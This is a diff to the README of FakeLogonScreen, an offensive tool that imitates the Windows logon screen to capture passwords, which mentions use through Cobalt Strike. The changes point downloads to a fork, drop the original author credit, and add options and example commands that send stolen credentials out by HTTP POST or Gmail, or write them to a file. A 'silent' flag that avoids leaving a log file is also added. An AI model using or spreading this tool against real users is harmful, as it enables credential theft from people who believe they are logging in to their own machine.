@@ -3,7 +3,7 @@ FakeLogonScreen is a utility to fake the Windows logon screen in order to obtain
 
 It can either be executed by simply running the .exe file, or using for example Cobalt Strike's `execute-assembly` command.
 
-Binaries available from the [Releases](https://github.com/bitsadmin/fakelogonscreen/releases) page.
+Binaries available from the [Releases](https://github.com/diegomardian/fakelogonscreen/releases) page.
 - FakeLogonScreen.exe: Writes output to console which for example is compatible with Cobalt Strike
 - FakeLogonScreenToFile.exe: Writes output to console and `%LOCALAPPDATA%\Microsoft\user.db`
 
@@ -18,9 +18,25 @@ Folders:
 - Username and passwords entered are outputted to console or stored in a file
 - Blocks many shortkeys to prevent circumventing the screen
 - Minimizes all existing windows to avoid other windows staying on top
+- Send results through either http, gmail, or to a file
 
-# Screenshot
-![FakeLogonScreen demo in Cobalt Strike](https://raw.githubusercontent.com/bitsadmin/fakelogonscreen/master/demo.gif "FakeLogonScreen demo in Cobalt Strike")
-
-
-**Authored by Arris Huijgen ([@bitsadmin](https://twitter.com/bitsadmin/) - https://github.com/bitsadmin/)**
+# How To Use
+FakeLogonScreen accepts these parameters:
+| Option | Description |
+| ------ | ---------- |
+| `http [url]` | Sends results to url as a json post request with the results contianed in "results" |
+| `gmail [email] [password]` | Sends a email to the specified email (Note: You must enable less apps accesss [here](https://www.google.com/settings/security/lesssecureapps) |
+| `file [filepath]` | writes results to the file specified |
+ FakeLogonScreen normally will make a log.txt file but if you append `silent` to the end it will not.
+## Http
+You can create your own server or you can use [DuckyServer](), a pre built server.
+## Exmaple using DuckyServer
+`FakeLogonScreen.exe http http://127.0.0.1//fake_login_screen silent`
+## Gmail
+To use Gmail make sure you go to [https://www.google.com/settings/security/lesssecureapps](https://www.google.com/settings/security/lesssecureapps) and enable "Allow less secure apps" for the account you will use.
+## Example
+`FakeLogonScreen.exe gmail testaccount@gmail.com testpassword silent`
+## File
+Just specify the file you would like FakeLogonScreen to write to.
+## Example
+`FakeLogonScreen.exe file C:\Users\test\`
